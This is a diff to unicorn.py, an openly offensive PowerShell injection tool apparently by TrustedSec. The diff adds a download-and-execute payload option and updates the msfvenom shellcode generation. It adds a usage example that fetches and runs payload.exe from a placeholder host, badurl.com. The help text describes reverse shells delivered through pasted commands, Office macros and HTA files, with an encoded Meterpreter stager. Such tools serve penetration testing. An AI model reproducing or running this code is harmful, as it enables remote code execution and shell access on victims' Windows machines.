@@ -33,7 +33,7 @@ def generate_random_string(low, high):
     letters = string.ascii_letters + string.digits
     return ''.join([random.choice(letters) for _ in range(length)])
 
-# needed for fire eyes muahahaha
+# needed for color in unicorn eyes
 class ColorsEnum:
     CYAN = '\033[96m'
     BLUE = '\033[94m'
@@ -142,7 +142,8 @@ supports remote command injection of some sort. Often times this could be throug
 through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to
 where you can use this attack at. Simply paste the powershell_attacks.txt command in any command prompt
 window or where you have the ability to call the powershell executable and it will give a shell back to
-you.
+you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter
+payloads.
 
 Note that you will need to have a listener enabled in order to capture the attack.
 
@@ -194,7 +195,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v2.2-----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v2.3-----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -203,6 +204,7 @@ def gen_usage():
     print("")
     print("Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>")
     print("PS Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443")
+    print("PS Down/Exec: python unicorn.py windows/download_exec exe=test.exe url=http://badurl.com/payload.exe")
     print("Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro")
     print("HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta")
     print("CRT Example: python unicorn.py <path_to_payload/exe_encode> crt")
@@ -301,8 +303,14 @@ def gen_hta_attack(command):
 def generate_shellcode(payload, ipaddr, port):
     print("[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...")
     port = port.replace("LPORT=", "")
+
+    # if we are using traditional payloads and not download_eec
+    if not "exe=" in ipaddr:
+       ipaddr = "LHOST=%s" % (ipaddr)
+       port = "LPORT=%s" % (port)
+
     proc = subprocess.Popen(
-        "msfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" % (
+        "msfvenom -p %s %s %s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" % (
             payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
@@ -311,7 +319,6 @@ def generate_shellcode(payload, ipaddr, port):
     data = reduce(lambda a, kv: a.replace(*kv),
                   iter(repls.items()), data).rstrip()
     return data
-
 
 # generate shellcode attack and replace hex
 def gen_shellcode_attack(payload, ipaddr, port):
